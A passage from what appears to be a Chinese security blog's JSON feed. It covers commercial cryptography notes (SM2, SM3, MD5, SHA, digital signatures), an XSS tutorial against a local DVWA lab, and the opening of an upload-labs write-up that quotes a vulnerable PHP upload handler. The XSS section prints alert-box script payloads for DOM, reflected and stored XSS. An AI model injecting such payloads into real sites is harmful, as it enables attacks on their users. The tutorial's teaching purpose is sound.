class=\"line\">即:C为26</span><br></pre></td></tr></table></figure>\n<p>国产密码算法</p>\n<p>国产密码算法是指由国家密码研究相关机构自主研发，具有相关知识产权的商用密码算法。</p>\n<p>1999 年国务院发布实施的《商用密码管理条例》第一章第二条规定：“本条例所称商用密码，是指对不涉及国家秘密内容的信息进行加密保护或者安全认证所使用的密码技术和密码产品。” 目前，已经公布的国产密码算法主要有 SM1 分组密码算法、SM2 椭圆曲线公钥密码算法、SM3 密码杂凑算法、SM4 分组算法、SM9 标识密码算法。各国产商用密码算法的特性统计如表 3-1 所示。</p>\n<p><img src=\"image-20221006151616629.png\" alt=\"image-20221006151616629\"></p>\n<h4 id=\"sm2椭圆素数域256\"><a class=\"markdownIt-Anchor\" href=\"#sm2椭圆素数域256\">#</a> SM2【椭圆素数域 256】</h4>\n<p>SM2 算法 <code>基于椭圆曲线</code> ，应用于公钥密码系统。</p>\n<p>对于一般椭圆曲线的离散对数问题，目前只存在指数级计算复杂度的求解方法。与大数分解问题及有限域上离散对数问题相比，椭圆曲线离散对数问题的求解难度要大得多。因此，在相同安全程度的要求下，椭圆曲线密码较其他公钥密码所需的密钥规模要小得多。</p>\n<p>SM2 算法可以用于数字签名、密钥交换、公钥加密。详见 GM/T 0009-2012《SM2 密码算法使用规范》。</p>\n<h4 id=\"sm3杂凑256\"><a class=\"markdownIt-Anchor\" href=\"#sm3杂凑256\">#</a> SM3【杂凑 256】</h4>\n<p>SM3 杂凑算法对长度为 l（1&lt;24）比特的消息 m，经过填充、迭代压缩，生成杂凑值， <code>杂凑值输出长度为256比特</code> 。</p>\n<p>详见 GM/T0004-2012《SM3 密码杂凑算法》。</p>\n<h4 id=\"hash函数\"><a class=\"markdownIt-Anchor\" href=\"#hash函数\">#</a> Hash 函数</h4>\n<p>杂凑函数简称 Hash 函数，它能够将任意长度的信息转换成固定长度的哈希值（又称数字摘要或消息摘要），并且任意不同消息或文件所生成的哈希值是不一样的。令 h 表示 Hash 函数，则 h 满足下列条件：<br>\n（1）h 的输入可以是任意长度的消息或文件 M；<br>\n（2）h 的输出的长度是固定的；<br>\n（3）给定 h 和 M，计算 h（M）是容易的；<br>\n（4）给定 h 的描述，找两个不同的消息 M，和 M2，使得 h（M）=h（M2）是计算上不可行的。<br>\nHash 函数的安全性，是指在现有的计算资源下，找到一个碰撞是不可能的。Hash 函数在网络安全应用中，不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。<br>\n例如，网页防篡改应用。网页文件管理者首先用网页文件生成系列 Hash 值，并将 Hash 值备份存放在安全的地方。然后定时再计算这些网页文件的 Hash 值，如果新产生的 Hash 值与备份的 Hash 值不一样，则说明网页文件被篡改了。</p>\n<h5 id=\"md5输入512-输出128\"><a class=\"markdownIt-Anchor\" href=\"#md5输入512-输出128\">#</a> MD5【输入 512 - 输出 128】</h5>\n<p>MD5（Message Digest Algorithm-5）算法是由 Rivest 设计的，于 1992 年公开，RFC1321 对其进行了详细描述。</p>\n<p>MD5 以 <code>512位</code> 数据块为单位来处理输入，产生 <code>128位</code> 的消息摘要，即<strong> MD5 能产生 128 比特长度的哈希值</strong>。</p>\n<p>MD5 使用广泛，常用在文件完整性检查。但是，据最新研究表明，MD5 的安全性受到挑战，王小云教授及其研究团队提出了 Hash 函数快速寻找碰撞攻击的方法，相关研究工作表明 MD5 的安全性已经不足。</p>\n<h5 id=\"sha输入512-输出160\"><a class=\"markdownIt-Anchor\" href=\"#sha输入512-输出160\">#</a> SHA【输入 512 - 输出 160】</h5>\n<p>SHA（Secure Hash Algorithm）算法由 NIST 开发，并在 1993 年作为联邦信息处理标准公布。</p>\n<p>SHA-1 与 MD5 的设计原理类似，同样也以 <code>512位</code> 数据块为单位来处理输入，产生 <code>160位</code> 的哈希值，具有<strong>比 MD5 更强的安全性</strong>。</p>\n<p>SHA 算法的安全性不断改进，已发布的版本有 SHA-2、SHA-3。</p>\n<p><code>注意</code> ：SHA 算法产生的哈希值长度有 SHA-224、SHA-256、SHA-384、SHA-512 等。但一般只考 SHA-1</p>\n<h5 id=\"sm3输入512-输出256\"><a class=\"markdownIt-Anchor\" href=\"#sm3输入512-输出256\">#</a> SM3【输入 512 - 输出 256】</h5>\n<p>SM3 是国家密码管理局千 2010 年公布的商用密码杂凑算法标准 该算法消息分组长度为 <code>512 比特</code> ，输出杂凑值长度为 <code> 256 比特</code> ，采用 Merkle-Damgard 结构。</p>\n<h4 id=\"数字签名\"><a class=\"markdownIt-Anchor\" href=\"#数字签名\">#</a> 数字签名</h4>\n<p>数字签名（Digital Signature）是指签名者使用私钥对待签名数据的杂凑值做密码运算得到的结果。</p>\n<p>该结果只能用签名者的公钥进行验证，用于确认待签名数据的完整性、签名者身份的真实性和签名行为的抗抵赖性。</p>\n<p>数字签名的目的是<strong>通过网络信息安全技术手段实现传统的纸面签字或者盖章的功能</strong>，以 <code>确认交易当事人的真实身份</code> ， <code>保证交易的安全性</code> 、 <code>真实性</code> 和 <code>不可抵赖性</code> 。</p>\n<p>数字签名具有与手写签名一样的特点，是<strong>可信的、不可伪造的、不可重用的、不可抵赖的</strong>以及<mark class=\"hl-label red\">不可修改</mark> 的。</p>\n<p>数字签名至少应满足以下三个条件：</p>\n<ol>\n<li><code>不可否认</code> 。签名者事后不能否认自己的签名。</li>\n<li><code>真实性</code> 。接收者能验证签名，而任何其他人都不能伪造签名。</li>\n<li><code>可鉴别性</code> 。当双方关于签名的真伪发生争执时，第三方能解决双方之间发生的争执。</li>\n</ol>\n<p>一个数字签名方案一般由签名算法和验证算法组成。</p>\n<p><code>签名算法密钥</code> 是 <code>秘密</code> 的，<strong>只有签名的人掌握</strong>；而 <code>验证算法</code> 则是 <code>公开</code> 的，以便他人验证。</p>\n<p>典型的数字签名方案有 RSA 签名体制、Rabin 签名体制、ElGamal 签名体制和 DSS（Data Signature Standard）标准。</p>\n<p>签名与加密很相似，一般是：</p>\n<ul>\n<li>签名方利用 <code>秘密密钥</code> （私钥）对需签名的数据进行 <code>加密</code> ，</li>\n<li>验证方利用签名者的 <code>公开密钥</code> （公钥）对签名数据做 <code>解密</code> 运算。</li>\n</ul>\n<p>签名与加密的不同之处在于：</p>\n<ul>\n<li><code>加密</code> 的目的是<strong>保护信息不被非授权用户访问</strong></li>\n<li><code>签名</code> 的目的是<strong>使消息接收者辨别 【信息的发送者，是谁】，信息是否被他人篡改</strong>。</li>\n</ul>\n",
            "tags": [
                "G计划"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/",
            "url": "https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/",
            "title": "XSS介绍",
            "date_published": "2022-10-04T16:56:24.000Z",
            "content_html": "<h1 id=\"xss跨站脚本介绍\"><a class=\"markdownIt-Anchor\" href=\"#xss跨站脚本介绍\">#</a> XSS 跨站脚本介绍</h1>\n<p>跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对<strong>用户输入过滤不足</strong>，输入可以显示在页面上对其他用户（普通用户、第三方用户、网站拥有者）造成影响的 <code>HTML+Js</code>  代码，从而<strong>盗取用户资料</strong>、<strong>利用用户身份进行某种动作</strong>或者<strong>对访问者进行病毒侵害</strong>的一种攻击方式。</p>\n<p>为了与层叠样式表（Cascading Style Sheets）的缩写 CSS 区分开，跨站脚本攻击通常简写为 <code>XSS</code> 。</p>\n<p><img src=\"image-20221004202321913.png\" alt=\"image-20221004202321913\"></p>\n<h2 id=\"反射型xss\"><a class=\"markdownIt-Anchor\" href=\"#反射型xss\">#</a> 反射型 XSS</h2>\n<p>发射型就是将应用程序的运行结果或错误返回到页面上显示。典型的反射型 XSS 是在搜索框里体现。</p>\n<h2 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h2>\n<p>存储在服务器、数据库（后台）上，能稳定持久执行的跨站脚本。</p>\n<h2 id=\"dom型xss\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h2>\n<p>能够构成 HTML 的 DOM 树的一部分，或者能够影响 DOM 结构的跨站脚本。</p>\n<h1 id=\"xss攻击方式与样例\"><a class=\"markdownIt-Anchor\" href=\"#xss攻击方式与样例\">#</a> XSS 攻击方式与样例</h1>\n<h2 id=\"xss盗用用户信息\"><a class=\"markdownIt-Anchor\" href=\"#xss盗用用户信息\">#</a> XSS 盗用用户信息</h2>\n<h2 id=\"xss盗取cookie\"><a class=\"markdownIt-Anchor\" href=\"#xss盗取cookie\">#</a> XSS 盗取 Cookie</h2>\n<h2 id=\"xss钓鱼攻击\"><a class=\"markdownIt-Anchor\" href=\"#xss钓鱼攻击\">#</a> XSS 钓鱼攻击</h2>\n<p>链接上含有攻击代码</p>\n<h2 id=\"xss蠕虫攻击\"><a class=\"markdownIt-Anchor\" href=\"#xss蠕虫攻击\">#</a> XSS 蠕虫攻击</h2>\n<p>XSS 蠕虫的破坏力和影响力都是巨大的。XSS 蠕虫主要发生在用户之间存在交互行为的页面中，当 Web 引用程序对用户输入的数据信息没有做严格的过滤时，通过结合用户的登录状态、API 调用、 <code>Ajax的异步提交</code> ，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现了代码的感染和传播，也就形成了 XSS 蠕虫。</p>\n<p>MySpace 的 Samy XSS 蠕虫攻击事件是出现最早、最出名的 XSS 蠕虫攻击事件。</p>\n<h1 id=\"通过实验深入了解xss三个分类\"><a class=\"markdownIt-Anchor\" href=\"#通过实验深入了解xss三个分类\">#</a> 通过实验深入了解 XSS 三个分类</h1>\n<p>首先我们安装 DVWA，使用账号：admin，密码：password 进行登录</p>\n<p><code>注意</code> ：如果登录不上去，就访问 <code>127.0.0.1/dvwa/setup.php</code> ，点击最下方的 <code>Create/Reset</code>  按钮</p>\n<p><img src=\"image-20221004210441095.png\" alt=\"image-20221004210441095\"></p>\n<p>设置 DVWA Security【从最低难度 low 开始吧】，点击 <code>submit</code>  等待刷新设置完成</p>\n<p><img src=\"image-20221004210537809.png\" alt=\"image-20221004210537809\"></p>\n<h2 id=\"dom型xss-2\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss-2\">#</a> DOM 型 XSS</h2>\n<p><img src=\"image-20221004210944194.png\" alt=\"image-20221004210944194\"></p>\n<p>首先我们看到下拉框，就要想一想，这个下拉框是从哪里来的。</p>\n<p>我们可以 F12 刷新，看一下 XHR 请求【Ajax】</p>\n<p>这里讲一下 <code>XHR</code>  和 <code>AJax</code>  的关系</p>\n<ul>\n<li><code>XMLHttpRequest</code>  （简称 <code>XHR</code> ）对象用于和服务器交换数据，是基于 <code>XML</code>  的 <code>HTTP</code>  请求。</li>\n<li><code>XMLHttpRequest</code>  是一个浏览器接口，使得 <code>Javascript</code>  可以进行 <code>HTTP(S)</code>  通信。</li>\n<li>自从浏览器提供有了 <code>XMLHTTPRequest</code>  这个接口之后，Ajax 操作就此诞生。</li>\n<li>我们再来说说什么是 <code>Ajax</code> ， <code>Ajax</code>  即  <code>Asynchronous JavaScript and XML</code> ，翻译为： <code>异步</code> 的  <code>JavaScript </code> 和 <code> XML</code> 。【<strong>重点！！</strong>】</li>\n<li><code>Ajax</code>  就是基于浏览器提供的 <code>XMLHttpRequest</code>  对象来实现的。【<strong>重点！！</strong>】</li>\n</ul>\n<p>传统的网页（不使用 Ajax）如果需要更新内容，必需重载整个网页面。</p>\n<p>自从有了 Ajax 之后，我们就可以实现<strong>异步地加载网页</strong>。</p>\n<p>什么叫异步？</p>\n<p>异步，异嘛，不同的意思，这里也就是指 <code>不跟</code> 浏览器加载执行网页代码的 <code>步伐</code> 一致，也就是说在一个网页中 <code>需要用户操作来触发执行代码</code> ，而不是整个网页代码 <code>一次性执行完毕</code>  (这里的用户操作是指在同一个网页下面请求代码执行渲染，而不是让浏览器直接跳转渲染另一个页面)。</p>\n<p>Ajax 指的是异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。所以，XMLHttpRequest 对象如果要用于 Ajax 的话，其 open () 方法的 async 参数必须设置为 true。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmlhttp.<span class=\"title function_ invoke__\">open</span>(<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;ajax_test.html&quot;</span>,<span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004211458850.png\" alt=\"image-20221004211458850\"></p>\n<p>所以表明，这个页面<strong>没有单独去请求一个功能链接</strong>来返回下拉链表内容。</p>\n<p>因此，我们直接去看源代码，鼠标右键，查看源代码【XSS 攻击是基于前台源码的攻击】。</p>\n<p>搜索关键字符：</p>\n<p><img src=\"image-20221004213743525.png\" alt=\"image-20221004213743525\"></p>\n<p>对于 HTML 的标签基本定义如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span> 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>标签常用于组合块级元素，以便通过 CSS 来对这些元素进行格式化。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span> 标签用于定义一个段落。 段落和段落之间有空隙。</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span> 标签用于创建供用户输入的 HTML 表单。表单用于向服务端发送数据。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span> 元素包含一个或多个如下的表单元素：</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span> 有输入框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span>  标签定义多行的文本输入控件</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span> 提交按钮</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span> 有下拉菜单属性</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">option</span>&gt;</span> 单选框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">optgroup</span>&gt;</span> 复选框</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span> 标签将表单内容的一部分打包，生成一组相关表单的字段。</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span> 标签为 input 元素定义标注（标记）。</span><br></pre></td></tr></table></figure>\n<p>其中，源码中显示这个 form 标签里面嵌有一段 script 标签引起的 JavaScript 代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;&quot; + lang + &quot;&#x27;</span>&gt;</span>&quot; + (lang) + &quot;<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;&#x27;</span> <span class=\"attr\">disabled</span>=<span class=\"string\">&#x27;disabled&#x27;</span>&gt;</span>----<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;English&#x27;</span>&gt;</span>English<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;French&#x27;</span>&gt;</span>French<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    document.write(&quot;<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&#x27;German&#x27;</span>&gt;</span>German<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span>&quot;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>主逻辑是：</p>\n<p>获取当前 form 表单 document 的 location 对象的 href（当前浏览的 url 值，对于下图就是 <code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/</code> ）</p>\n<p>然后判断这个 url 字符串中 “default=” 第一次出现的位置是否 &gt;=0</p>\n<p><img src=\"image-20221004215924339.png\" alt=\"image-20221004215924339\"></p>\n<p>当然，我们回到刚刚的页面上就是在获取这个 url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004220400905.png\" alt=\"image-20221004220400905\"></p>\n<p>substring(start,stop)</p>\n<p>然后截取从 “default=” 第一次出现的位置 + 8【也就是 = 号右边第一个字符，把整个 “default=” 跨了过去】到结尾的内容的字符串，保存到 lang 变量。</p>\n<p>往 document，也就是当前 html 页面的 option 标签的 value 值中写入刚刚获取到的 lang 值，其选项显示部分使用 decoreURI 对 lang 进行解码，由于 English 中未含有非英文部分，所以就是 English。【这一步会往选项里再添加一个 English】</p>\n<p>接着往当前 html 页面的 option 标签里的 value 写入空，且关闭其选择属性，加入 ---- 这个选项。【这一步会往选项里再添加一个 ----】</p>\n<p><img src=\"image-20221004221129050.png\" alt=\"image-20221004221129050\"></p>\n<p>那么，我们可以看到，这个 lang 是从当前 url 里获取到的，且未经过任何校验就直接写入标签中。</p>\n<p>我们可以控制这个 lang 变量，使其直接执行 js 脚本</p>\n<p><img src=\"image-20221004221907384.png\" alt=\"image-20221004221907384\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004222113645.png\" alt=\"image-20221004222113645\"></p>\n<p>其改变了当前 HTML 的页面 DOM 结构，因此，我们称其为 DOM 型 XSS 攻击。</p>\n<h2 id=\"反射型xss-2\"><a class=\"markdownIt-Anchor\" href=\"#反射型xss-2\">#</a> 反射型 XSS</h2>\n<p>我们输入 11111，结果看到页面回显了 &quot;Hello 11111&quot;</p>\n<p><img src=\"image-20221004222654007.png\" alt=\"image-20221004222654007\"></p>\n<p>看一下前台代码，是使用 GET 请求去将获取 text 的内容发送给服务器，而 text 我们可控</p>\n<p><img src=\"image-20221004222954963.png\" alt=\"image-20221004222954963\"></p>\n<p>输入 11111，会回显到前台。</p>\n<p><img src=\"image-20221004223147315.png\" alt=\"image-20221004223147315\"></p>\n<p>那么，我们发现 11111 可能未经过处理，直接放入 pre 标签显示。</p>\n<p>因此可以在 pre 标签里插入 script 标签，完成弹窗操作。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(666)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004223056096.png\" alt=\"image-20221004223056096\"></p>\n<p>因为这个页面将一些交互内容回显到了前台上，使得我们成功利用 Js 脚本完成攻击，我们称其为反射型 XSS 攻击。</p>\n<h2 id=\"存储型xss-2\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss-2\">#</a> 存储型 XSS</h2>\n<p><img src=\"image-20221004223720910.png\" alt=\"image-20221004223720910\"></p>\n<p>我们通过留言功能，可以看到我们的输入会被记录在页面上。</p>\n<p><img src=\"image-20221004223847678.png\" alt=\"image-20221004223847678\"></p>\n<p>我们按照刚刚的思路，直接尝试看看能否弹窗。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name：jack</span><br><span class=\"line\">Message：&lt;script&gt;alert(1234)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>刷新回来后会一直弹窗</p>\n<p><img src=\"image-20221004224120560.png\" alt=\"image-20221004224120560\"></p>\n<p>我们看下源码信息</p>\n<p><img src=\"image-20221004224444379.png\" alt=\"image-20221004224444379\"></p>\n<p>我们看到 Name 的 maxlength 为 10，Message 的 length 为 50，所以使用 Message 来做 XSS 攻击更合适一些</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</span><br><span class=\"line\">最简短的js脚本也有24个字符</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004224705526.png\" alt=\"image-20221004224705526\"></p>\n<p>如果两个长度都不限，则都适合用来 XSS 攻击。</p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "title": "特殊的文件上传漏洞（二）",
            "date_published": "2022-10-04T02:51:46.000Z",
            "content_html": "<h1 id=\"特殊的文件上传漏洞二\"><a class=\"markdownIt-Anchor\" href=\"#特殊的文件上传漏洞二\">#</a> 特殊的文件上传漏洞（二）</h1>\n<p>本章节讲解特殊的文件上传漏洞（二）。</p>\n<h2 id=\"绕过图像二次渲染\"><a class=\"markdownIt-Anchor\" href=\"#绕过图像二次渲染\">#</a> 绕过图像二次渲染</h2>\n<p>Pass-16 为例</p>\n<p>直接审计源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmpname</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>=UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的扩展名</span></span><br><span class=\"line\">    <span class=\"variable\">$fileext</span>= <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;.&quot;</span>),<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;jpg&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = <span class=\"title function_ invoke__\">imagecreatefromjpeg</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                <span class=\"title function_ invoke__\">srand</span>(<span class=\"title function_ invoke__\">time</span>());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = <span class=\"title function_ invoke__\">strval</span>(<span class=\"title function_ invoke__\">rand</span>()).<span class=\"string\">&quot;.jpg&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">imagejpeg</span>(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;png&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/png&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = <span class=\"title function_ invoke__\">imagecreatefrompng</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                 <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                <span class=\"title function_ invoke__\">srand</span>(<span class=\"title function_ 